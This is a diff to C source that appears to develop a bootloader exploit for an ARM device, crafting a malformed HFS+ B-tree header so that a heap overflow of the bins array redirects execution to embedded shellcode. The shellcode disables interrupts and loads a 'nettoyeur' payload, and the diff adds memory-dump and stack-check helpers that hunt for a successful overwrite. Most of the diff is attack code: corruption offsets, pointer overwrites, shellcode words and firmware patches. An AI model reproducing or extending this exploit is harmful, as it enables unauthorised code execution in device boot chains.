@@ -50,7 +50,7 @@
 #define bcopy_ADDR              (0x31E64) //yes
 #define decompress_lzss_ADDR    (0x23260 + 1) //yes
 
-#define memalign_ADDR           (0x186e4 + 1) //yes
+#define memalign_ADDR           (0x186E4 + 1) //yes
 
 void NAKED
 my_breakpoint1(void)
@@ -67,21 +67,113 @@ my_breakpoint1(void)
 #endif /* __arm__ */
 }
 
+#if DO_DUMPS || DO_BINS || DO_STACKCHECK
+int
+create_bin_dump(const char *base, unsigned int sp, unsigned int t2)
+{
+    char name[255];
+    memset(name, 0x0, sizeof(name));
+    sprintf(name, "%s/0x%x_%d_%d", base, sp, drill_path, node_size);
+    
+    unsigned int offset = 0x447C8 >> 2; //this is the start of bins address
+    unsigned int len = 0x20;
+    
+    FILE *ofd = fopen(name, "w+");
+    if (ofd) {
+        unsigned int start = 0x0;
+        
+        for (; start < len; start++) {
+            if (sp == image + offset * 4 + start * 4) {
+                fprintf(ofd, "[%x] 0x%x <--- stack\n", (unsigned int)image + offset * 4 + start * 4, ((unsigned int *)image)[offset + start]);
+            }else if (t2 == image + offset * 4 + start * 4) {
+                fprintf(ofd, "[%x] 0x%x <--- start\n", (unsigned int)image + offset * 4 + start * 4, ((unsigned int *)image)[offset + start]);
+            }else{
+                fprintf(ofd, "[%x] 0x%x\n", (unsigned int)image + offset * 4 + start * 4, ((unsigned int *)image)[offset + start]);
+            }
+        }
+        fclose(ofd);
+        return 0;
+    }
+    return -1;
+}
+#endif
 
 #ifdef __arm__
 void
 real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r8 __asm("r8");
+    //register unsigned int r9 __asm("r9");
     register unsigned int sp __asm("r11");
     //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
     if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
         unsigned int t2 = (uintptr_t)image + 0x447A0 + 0x28 + r3 * 4;
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
         dumpfile("DUMP_z1");
+#if DO_DUMPS
+        if (create_bin_dump("dumps", sp, t2) == 0) {
+            //eprintf("Created dump of bins\n");
+        }else{
+            fprintf(stderr, "Error while creating dump of bins\n");
+        }
+#elif DO_BINS
+        if (r3 != 0x2) {
+            if (create_bin_dump("dumps_gud", sp, t2) == 0) {
+                //eprintf("Created dump of bins\n");
+            }else{
+                fprintf(stderr, "Error while creating dump of bins\n");
+            }
+        }
+#elif DO_STACKCHECK
+        eprintf("Checking stack...\n");
+        eprintf("Starting from 0x%x\n", t2);
+        eprintf("Stack is at   0x%x\n", sp);
+        eprintf("*** BINS ***\n");
+        
+        unsigned int offset = 0x447C8 >> 2;
+        unsigned int len = 0x20;
+        
+        unsigned int st = (t2 - (uintptr_t)image) >> 2;
+        for (; st <= offset + len; st++) {
+            unsigned int bin = ((unsigned int *)image)[st];
+            eprintf("[%x]:     0x%x\n", image + (st << 2), bin);
+            if (bin == 0x0) {
+                continue;
+            }else{
+                if (bin - (uintptr_t)image == 0x44694 + 14) {
+                    eprintf("*** WICTORY ***\n");
+                    dumpfile("WICTORY");
+                    if (create_bin_dump("stack_check", sp, t2) == 0) {
+                        //eprintf("Created dump of bins\n");
+                    }else{
+                        fprintf(stderr, "Error while creating dump of bins\n");
+                    }
+                    
+#if 1
+                    eprintf("Printing memory...\n");
+                    eprintf("*** MEMORY ***\n");
+                    unsigned int i = 0x44694;
+                    for (; i < 0x447C8 + 0x20 * 4; i += 0x10) {
+                        eprintf("[%x] ", (uintptr_t)image + i);
+                        unsigned int c = i;
+                        for (; c - i < 0x10; c += 4) {
+                            eprintf("%02x", ((unsigned char *)image)[c + 0x0]);
+                            eprintf("%02x", ((unsigned char *)image)[c + 0x1]);
+                            eprintf("%02x", ((unsigned char *)image)[c + 0x2]);
+                            eprintf("%02x ", ((unsigned char *)image)[c + 0x3]);
+                        }
+                        eprintf("\n");
+                    }
+#endif
+                }else{
+                    eprintf("Nothing :(\n");
+                }
+                break;
+            }
+        }
+#endif
     }else{
 #if 0
-        register unsigned int r9 __asm("r9");
         fprintf(stderr, "sp = 0x%x, r3 = 0x%x, r9 = 0x%x\n", sp, r3, r9);
 #endif
     }
@@ -110,11 +202,29 @@ void
 real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
 {
     register unsigned int r8 __asm("r8");
+    //register unsigned int r9 __asm("r9");
     register unsigned int sp __asm("r11");
     //0x447A0 + 0x28 + 32 * 4 is the limit of the bins array for the heap;
     if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
         dumpfile("DUMP_z3");
+        
+#if 1
+        eprintf("Printing memory...\n");
+        eprintf("*** MEMORY ***\n");
+        unsigned int i = 0x44694;
+        for (; i < 0x447C8 + 0x20 * 4; i += 0x10) {
+            eprintf("[%x] ", (uintptr_t)image + i);
+            unsigned int c = i;
+            for (; c - i < 0x10; c += 4) {
+                eprintf("%02x", ((unsigned char *)image)[c + 0x0]);
+                eprintf("%02x", ((unsigned char *)image)[c + 0x1]);
+                eprintf("%02x", ((unsigned char *)image)[c + 0x2]);
+                eprintf("%02x ", ((unsigned char *)image)[c + 0x3]);
+            }
+            eprintf("\n");
+        }
+#endif
     }
     (void)(r0 && r1 && r2 && r3);
 }
@@ -213,8 +323,10 @@ my_adjust_stack(void)
 void
 my_adjust_environ(void)
 {
-#if 1
-    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9disk.dmg", 0);
+#if 0
+    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9/disk.dmg", 0);
+#else
+    CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9/disk.dmg", 0);
 #endif
 }
 
@@ -317,10 +429,10 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#if MATRIX
+#if DO_DUMPS || DO_BINS || DO_STACKCHECK
 #define NODE_SIZE (node_size)
 #else
-#define NODE_SIZE (0x4000) //todo
+#define NODE_SIZE (0x2000) //todo
 #endif
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
@@ -364,8 +476,8 @@ my_readp(void *ih, void *buffer, long long offset, int length)
 #endif
                 break;
             case 2:
-#if NETTO
                 memset(buffer, 'F', length);
+#if NETTO
                 if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
 #endif
                 PUT_WORD_BE(buffer, 32, NODE_SIZE);            /* BTHeaderRec::nodeSize */
@@ -373,11 +485,11 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
                 PUT_WORD_LE(buffer, 20, 0);                /* must be zero (see above) */
                 PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
-#if SHELLCODE
-#define START_OF_BTREE_HEADER 0x44594 //useless
-#define START_OF_EXTENTS_BTREE_HEADER START_OF_BTREE_HEADER + 0x100 //0x44694
-#define ALIGNED_POINTER_OFFSET START_OF_EXTENTS_BTREE_HEADER + 0x2C //todo
-#define START_OF_SHELLCODE 0x446F0
+                
+#define START_OF_BTREE_HEADER 0x44594
+#define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) //0x44694
+#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x54) //0x2C, 0x34, 0x3C, 0x44, 0x54 (0x52)
+#define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48) //todo
                 
                 //bins (more or less) is at offset 0x447A0 (!!!)
                 //first bin is at 0x447A0 + 0x28 = 0x447C8
@@ -385,14 +497,14 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */ //this is a store
                 
                 PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */ //todo >> 6 //this is a store
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */ //todo, 0x446F1 is right?
-                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x446EC);    /* r11 -> lr */ //todo
+                
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */ //todo
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x447FC);    /* r11 -> lr */ //todo
 #if 0
                 PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
 #else
-                
+#if SHELLCODE
                 /* SHEELCODE */
-                
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   0 - START_OF_EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC72);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   4 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE +  4, disable_interrupts_ADDR - 1));
                 PUT_WORD_LE(buffer,  START_OF_SHELLCODE +   8 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(4, 68));
@@ -428,8 +540,24 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47d3c /* nettoyeur compressed */);
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
-                
                 /* END */
+#else
+                /*((unsigned char *)image)[START_OF_SHELLCODE + 0x0] = 0x4B;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x1] = 0x48;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x2] = 0x4C;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x3] = 0x49;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x4] = 0x06;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x5] = 0xF0;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x6] = 0xE4;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x7] = 0xF8;
+                ((unsigned char *)image)[START_OF_SHELLCODE + 0x8] = 0x0;*/
+                
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x2 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x4 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x6 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x8 - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0xA - START_OF_EXTENTS_BTREE_HEADER, INSNT_NOP);
 #endif
 #endif
                 break;
@@ -460,7 +588,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                      }
                      */
 #if TREEDEPTH
-#if MATRIX
+#if DO_DUMPS || DO_BINS || DO_STACKCHECK
                     drillDownPathTill(buffer, seq, drill_path, 0x10000);
 #else
                     drillDownPathTill(buffer, seq, 1, 0x10000);
@@ -729,6 +857,12 @@ patch_image(unsigned char *image)
     *(uint32_t *)(image + 0x1DD48) = INSN2_RETURN_0; //yes
     *(uint32_t *)(image + 0x1DF08) = INSN2_RETURN_0; //yes
 #endif /* !USE_SIGNAL */
+    
+    //*(uint16_t *)(image + 0x22F8C) = INSNT_NOP; //problem1
+    //-->
+    //*(uint16_t *)(image + 0x22E54) = INSNT_NOP; //no issues
+    //*(uint16_t *)(image + 0x22E64) = INSNT_NOP; //no issues
+    //*(uint16_t *)(image + 0x22E7E) = INSNT_NOP; //<-- here is the problem, if we need to pump NODE_SIZE mount->cookie->fs->ops->open(mount->cookie->ctxt, shortpath, flags) will fail
 }
 
 
